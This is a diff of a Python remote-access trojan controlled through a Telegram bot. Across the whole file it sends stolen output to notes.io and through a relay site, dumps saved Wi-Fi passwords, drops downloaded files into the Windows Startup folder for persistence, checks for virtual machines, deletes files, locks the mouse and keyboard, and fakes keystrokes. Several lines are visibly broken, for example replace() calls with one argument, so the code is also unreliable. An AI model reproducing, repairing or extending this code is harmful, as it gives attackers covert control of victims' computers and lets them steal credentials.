@@ -1,16 +1,19 @@
 # import libraries
-from os import chdir, getcwd, remove, startfile
+from os import chdir, getcwd, remove, startfile, mkdir
 from time import tzname, sleep, strftime
 from subprocess import getoutput, Popen
 from pyautogui import write, hotkey
 from pynput import mouse, keyboard
+import win32com.client as wincl
 from tkinter import messagebox
 import json, wget, webbrowser
 from bs4 import BeautifulSoup
 from getpass import getuser
 from platform import uname
 from tkinter import *
+import threading
 import requests
+import socket
 import os
 # get file location
 cwd = getcwd()
@@ -22,16 +25,6 @@ def check_internret(): # send a request to google.com to check internet connecti
     except: 
         return False
 if check_internret(): # if internet connection was success run main program
-    from time import tzname, sleep, strftime
-    from subprocess import getoutput, Popen
-    from pyautogui import write, hotkey
-    from pynput import mouse, keyboard
-    import json, wget, webbrowser
-    from bs4 import BeautifulSoup
-    from getpass import getuser
-    from platform import uname
-    import threading
-    import socket
     # create first values
     mouse_listener = mouse.Listener(suppress=True)
     keyboard_listener = keyboard.Listener(suppress=True)
@@ -39,6 +32,7 @@ if check_internret(): # if internet connection was success run main program
     local_ip = socket.gethostbyname(socket.gethostname())
     token = BOT_TOKEN 
     id = TELEGRAM_ID
+    max_letter = MAX_LETTER
     keep_disable = True
     commands = ["/check", 
                 "/sysinfo", 
@@ -53,14 +47,13 @@ if check_internret(): # if internet connection was success run main program
                 "/download",
                 "/connected_wifi",
                 "/wifi_password",
-                "/con_wifi_names",
+                "/all_connected_wifis",
                 "/check_exist",
                 "/whereami",
                 "/startup",
                 "/check_vm",
                 "/mkdir",
                 "/rm",
-                "/create_file",
                 "/show_error",
                 "/show_info",
                 "/show_warning",
@@ -69,25 +62,43 @@ if check_internret(): # if internet connection was success run main program
                 "/enable_mouse_keyboard",
                 "/chdir",
                 "/process",
-                "/chruns",
+                "/check_app_location",
                 "/drivers",
-                "/localhost", 
                 "/open_app", 
                 "/write_word", 
-                "/hotkey",
                 "/press_enter",
                 "/alt_f4",
-                "/find_all"]
+                "/find_file"]
     # commands functions
+    def send_to_note(text):
+        url = "https://notes.io/short.php"
+        data = {"txt":text}
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+            "Referer": "https://notes.io/"}
+
+        response = requests.post(url, data=data, headers=headers, timeout=50)
+
+        if response.status_code == 200:
+            soup = BeautifulSoup(response.content.decode(), "html.parser")
+            find_tag = soup.find("a").findAll("div")
+            link = "https://www.notes.io/"
+            code = str(find_tag[-1]).replace('<div class="key">', "").replace("</div>", "")
+            link += code
+            return link
+        return "Error while sending to note;"
     def send_msg(message, token=token, id=id):
         try:
+            if len(message) > max_letter:
+                note_url = send_to_note(message)
+                message = note_url
             url = f"https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text={message}"
             data = {"UrlBox":url,
                     "AgentList":"Internet Explorer",
                     "VersionsList":"HTTP/1.1",
                     "MethodList":"GET"}
-            RATg = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", data=data)
-            if RATg.status_code == 200: return True
+            response = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", data=data)
+            if response.status_code == 200: return True
             else: return False
         except: return False
     def read_msg(token=token):
@@ -169,27 +180,20 @@ if check_internret(): # if internet connection was success run main program
         except: send_msg("Error;")
     def download():
         try:
-            send_msg("write file url(in 10 seconds):")
-            sleep(10)
-            url = read_msg()
-            send_msg("write path to install(in 10 seconds):")
-            sleep(10)
-            path = read_msg()
-            if path != url: wget.download(url, out=path)
-            else: wget.download(url)
-            send_msg("File is downloaded.")
+            info = read_msg().replace("/download ").split(" ")
+            if info[1] != info[0]: wget.download(info[0], out=info[1])
+            else: wget.download(info[0])
+            send_msg(f"{info[0]} is downloaded in {info[1]}.")
         except: send_msg("Error;")
     def connected_wifi():
         try:
-            ssid = getoutput('netsh wlan show interfaces').replace("", "").replace("Thereis1interfaceonthesystem:", "").replace("Hostednetworkstatus:Notavailable", "").replace("\n\n\n", "").split("\n")[6].replace("SSID:", "")
+            ssid = getoutput('netsh wlan show interfaces')
             send_msg(ssid)
         except: send_msg("Error;")
     def wifi_password():
         try:
-            send_msg("write SSID(in 10 seconds):")
-            sleep(10)
-            ssid = read_msg()
-            passw = getoutput(f"netsh wlan show profiles {ssid} key=clear").replace(" ", "").replace("ProfileoninterfaceWi-Fi:", "").replace("=======================================================================", "").replace("Applied:AllUserProfile", "").replace("Profileinformation", "").replace("-------------------", "").replace("\n\n\n\n\n\n\n\n", "").replace("-----------------", "").replace("-------------", "").replace("--", "").split("\n")
+            ssid = read_msg().replace("/wifi_password ")
+            passw = getoutput(f'netsh wlan show profiles "{ssid}" key=clear').replace(" ", "").replace("ProfileoninterfaceWi-Fi:", "").replace("=======================================================================", "").replace("Applied:AllUserProfile", "").replace("Profileinformation", "").replace("-------------------", "").replace("\n\n\n\n\n\n\n\n", "").replace("-----------------", "").replace("-------------", "").replace("--", "").split("\n")
             def find_password():
                 for i in range(len(passw)):
                     if "KeyContent" in passw[i]:
@@ -198,116 +202,70 @@ if check_internret(): # if internet connection was success run main program
         except: send_msg("Error;")
     def check_exist():
         try:
-            send_msg("write your file address(in 8 seconds):")
-            sleep(8)
-            addr = read_msg()
-            send_msg("write your file name(in 8 seconds): ")
-            sleep(8)
-            file = read_msg()
-            if file != addr: state = os.Check_exist(addr, file)
-            else: os.Check_exist(File_name=file)
+            file = read_msg().replace("/check_exist ", "")
+            try:
+                with open(file, "r") as file:
+                    file.readlines()
+                    state = True
+            except FileNotFoundError: state = False
             send_msg(f"This is the response:\n{state}")
         except: send_msg("Error;")
     def all_commands():
         commands_txt = """"""
-        for i in range(len(commands)):
-            commands_txt += f"{i+1}. {commands[i]}\n"
-        send_msg(commands_txt)
-    def connected_wifi_names():
+        for num, command in enumerate(commands):
+            commands_txt += f"{num}. {command}\n"
+        send_to_note(commands_txt)
+    def all_connected_wifis():
         try:
-            names = getoutput("netsh wlan show profiles").replace("Profiles on interface Wi-Fi:", "").replace("Group policy profiles (read only)", "").replace("---------------------------------", "").replace("    <None>", "").replace("\n\n\n\n\n\n\n", "").replace("User profiles", "").replace("-------------", "").replace("    ", "").replace("\n\n", "").replace("All User Profile : ", "").split("\n")
-            names.remove("")
-            for i in range(len(names)): 
-                send_msg(f"Number {i + 1}: {names[i]}")
+            send_msg(getoutput("netsh wlan show profiles"))
         except: send_msg("Error;")
     def whereami():
-        try: send_msg(os.Get_code_address())
+        try: send_msg(getcwd())
         except: send_msg("Error;")
     def startup():
         try:
-            send_msg("Write your download link(in 10 seconds):")
-            sleep(10)
-            url = read_msg()
+            url = read_msg().replace("/startup ", "")
             path = fr"C:\Users\{getuser()}\AppData\Roaming\Microsoft\Windows\Start Menu\PrograRAT\Startup"
             wget.download(url, out=path)
-            send_msg("File is added to startup.")
+            send_msg(f"{url} is added to startup.")
         except: send_msg("Error;")
     def check_vm():
         try:
             vm = getoutput("powershell wmic computersystem get model").replace("\n", "").replace("Model", "").replace(" ", "")
             send_msg(vm)
         except: send_msg("Error;")
-    def mkdir():
+    def make_dir():
         try:
-            send_msg("write directory name(in 10 seconds):")
-            sleep(10)
-            name = read_msg()
-            os.Create_directory(name)
-            send_msg(f"{name} Directory is created.")
+            name = read_msg().replace("/mkdir ", "")
+            mkdir(name)
+            send_msg(f"{name} directory is created.")
         except: send_msg("Error;")
     def rm():
         try:
-            send_msg("write file name(in 10 seconds):")
-            sleep(10)
-            file = read_msg()
-            send_msg("write file address(in 10 seconds):")
-            sleep(10)
-            addr = read_msg()
-            if file != addr: 
-                remove(addr+file)
-                send_msg(f"{addr+file} is removed.")
-            else: 
-                remove(file)
-                send_msg(f"{file} is removed.")
-        except: send_msg("Error;")
-    def create_file():
-        try:
-            send_msg("write your file name(in 10 seconds):")
-            sleep(10)
-            name = read_msg()
-            send_msg("write your file text(in 10 seconds):")
-            sleep(10)
-            text = read_msg()
-            with open(name, "w") as writer: writer.write(text)
-            send_msg(f"{name} is created.")
+            file = read_msg().replace("/rm ")
+            remove(file)
+            send_msg(f"{file} is removed.")
         except: send_msg("Error;")
     def show_error():
         try:
-            send_msg("write the title of error message(in 10 seconds):")
-            sleep(10)
-            title = read_msg()
-            send_msg("write the text of error message(in 10 seconds):")
-            sleep(10)
-            text = read_msg()
-            messagebox.showerror(title, text)
+            data = read_msg().replace("/show_error ", "").split(" ")
+            messagebox.showerror(data[0], data[1])
         except: send_msg("Error;")
     def show_info():
         try:
-            send_msg("write the title of info message(in 10 seconds):")
-            sleep(10)
-            title = read_msg()
-            send_msg("write the text of info message(in 10 seconds):")
-            sleep(10)
-            text = read_msg()
-            messagebox.showinfo(title, text)
+            data = read_msg().replace("/show_info ", "").split(" ")
+            messagebox.showerror(data[0], data[1])
         except: send_msg("Error;")
     def show_warning():
         try:
-            send_msg("write the title of warning message(in 10 seconds):")
-            sleep(10)
-            title = read_msg()
-            send_msg("write the text of warning message(in 10 seconds):")
-            sleep(10)
-            text = read_msg()
-            messagebox.showwarning(title, text)
+            data = read_msg().replace("/show_warning ", "").split(" ")
+            messagebox.showerror(data[0], data[1])
         except: send_msg("Error;")
     def voice():
         try:
-            send_msg("write your text(in 10 seconds):")
-            sleep(10)
-            text = read_msg()
-            voice = Hub.Voice(text)
-            voice.Say()
+            text = read_msg().replace("/voice ")
+            speak = wincl.Dispatch("SAPI.SpVoice")
+            speak.Speak(text)
         except: send_msg("Error;")
     def disable_mouse_keyboard():
         try:
@@ -323,47 +281,32 @@ if check_internret(): # if internet connection was success run main program
         except: send_msg("Error;")
     def change_dir():
         try:
-            send_msg("write the address you want to go(in 10 seconds):")
-            sleep(10)
-            addr = read_msg()
+            addr = read_msg().replace("/chdir ", "")
             chdir(addr)
             send_msg(f"address changed to {addr}")
         except: send_msg("Error;")
     def process():
         try:
             process = getoutput("wmic process get name").replace("Name", "").replace("\n\n", "").replace("System", "").replace("Secure", "").replace("Registry", "").split()
-            for i in process:
-                if i[-4:] == ".exe": send_msg(i)
-                else: pass
-                pass_state = read_msg()
-                if pass_state == "/pass": break
+            note_url = send_to_note(process)
+            send_msg(f"data saved in: {note_url}")
         except: send_msg("Error;")
-    def chruns():
+    def check_app_location():
         try:
-            send_msg("write your app name(in 10 seconds): ")
-            sleep(10)
-            app = read_msg()
+            app = read_msg().replace("/check_app_location ")
             location = getoutput(f"wmic process where name=\"{app}\" get ExecutablePath")
             send_msg(f"This is the response:\n{location}")
         except: send_msg("Error;")
     def drivers():
         try:
             data = getoutput("net share").replace("Share name", "").replace("Resource", "").replace("Remark", "").replace("-------------------------------------------------------------------------------", "").replace("The command completed successfully.", "").replace("\n\n", "").replace("Default share","").replace("Remote IPC", "").replace("Remote Admin", "").replace(r"C:\windows", "").replace("IPC$", "").replace("ADMIN$", "").replace(" ", "").split()
+            for driver in range(len(data)):
+                data[driver] = data[driver][0:1]
             send_msg(f"This is the response:\n{data}")
-        except: send_msg("Error;")
-    def localhost():
-        try:
-            send_msg("write your port(in 8 seconds):")
-            sleep(8)
-            port = read_msg()
-            Popen(f"python -m http.server {port} -b {local_ip}", shell=True)
-            send_msg(f"Localhost is started at: http://{local_ip}:{port}")
         except: send_msg("Error;")
     def open_app():
         try:
-            send_msg("write complete name of application(in 10 seconds || example: cmd.exe):")
-            sleep(10)
-            name = read_msg()
+            name = read_msg().replace("/open_app ", "")
             try:
                 startfile(name)
                 send_msg(f"{name} application is opened.")
@@ -372,20 +315,9 @@ if check_internret(): # if internet connection was success run main program
         except: send_msg("Error;")
     def write_word():
         try:
-            send_msg("write your text(in 5 seconds):")
-            sleep(5)
-            text = read_msg()
+            text = read_msg().replace("/write_word ", "")
             write(text)
-            send_msg(f"{text} is writed")
-        except: send_msg("Error;")
-    def _hotkey():
-        try:
-            send_msg("write your hotkeys(in 10 seconds || split with space):")
-            sleep(10)
-            all_key = str(read_msg()).split(" ")
-            len_key = len(all_key)
-            if len_key == 1 and len_key != 0: hotkey(all_key[0])
-            else: hotkey(all_key[0], all_key[1])
+            send_msg(f"{text} is writed.")
         except: send_msg("Error;")
     def press_enter():
         try: hotkey("enter")
@@ -393,19 +325,14 @@ if check_internret(): # if internet connection was success run main program
     def alt_f4():
         try: hotkey("alt", "f4")
         except: send_msg("Error;")
-    def find_all():
+    def find_file():
         try:
-            send_msg("write limit of find(in 5 seconds):")
-            sleep(5)
-            limit = int(read_msg())
-            send_msg("write file format(in 5 seconds): ")
-            sleep(5)
-            form = read_msg()
-            all_files = getoutput(f"dir /s /b *.{form}")
+            data = read_msg().replace("/find_file ", "").split(" ")
+            all_files = getoutput(f"dir /s /b *.{data[0]}")
             all_files = all_files.split("\n")
             out = """"""
             for i in range(len(all_files)):
-                if i + 1 == limit: break
+                if i + 1 == data[1]: break
                 else:
                     out += f"{i+1}. {all_files[i]}\n"
             send_msg(out)
@@ -431,30 +358,27 @@ if check_internret(): # if internet connection was success run main program
                     if command.startswith("/wifi_password"): wifi_password()
                     if command.startswith("/check_exist"): check_exist()
                     if command.startswith("/all_commands"): all_commands()
-                    if command.startswith("/connected_wifi_names"): connected_wifi_names()
+                    if command.startswith("/all_connected_wifis"): all_connected_wifis()
                     if command.startswith("/whereami"): whereami()
                     if command.startswith("/startup"): startfile()
                     if command.startswith("/check_vm"): check_vm()
-                    if command.startswith("/mkdir"): mkdir()
+                    if command.startswith("/mkdir"): make_dir()
                     if command.startswith("/rm"):  rm()
-                    if command.startswith("/create_file"): create_file()
-                    if command.startswith("/show_error"): show_error()
-                    if command.startswith("/show_info"): show_info()
-                    if command.startswith("/show_warning"): show_warning()
+                    if command.startswith("/show_error"): threading.Thread(target=show_error).start()
+                    if command.startswith("/show_info"): threading.Thread(target=show_info).start()
+                    if command.startswith("/show_warning"): threading.Thread(target=show_warning).start()
                     if command.startswith("/voice"): voice()
                     if command.startswith("/disable_mouse_keyboard"): threading.Thread(target=disable_mouse_keyboard).start()
                     if command.startswith("/enable_mouse_keyboard"): threading.Thread(target=enable_mouse_keyboard).start()
                     if command.startswith("/chdir"): change_dir()
                     if command.startswith("/process"): process()
-                    if command.startswith("/chruns"):  chruns()# Check run locations
+                    if command.startswith("/check_app_location"):  check_app_location()# Check run locations
                     if command.startswith("/drivers"): drivers()
-                    if command.startswith("/localhost"): localhost()
                     if command.startswith("/open_app"): open_app()
                     if command.startswith("/write_word"): write_word()
-                    if command.startswith("/hotkey"): _hotkey()
                     if command.startswith("/press_enter"): press_enter()
                     if command.startswith("/alt_f4"): alt_f4()
-                    if command.startswith("/find_all"): find_all()
+                    if command.startswith("/find_file"): find_file()
                     send_msg("click /pass")
                     sleep(5)
             except: 
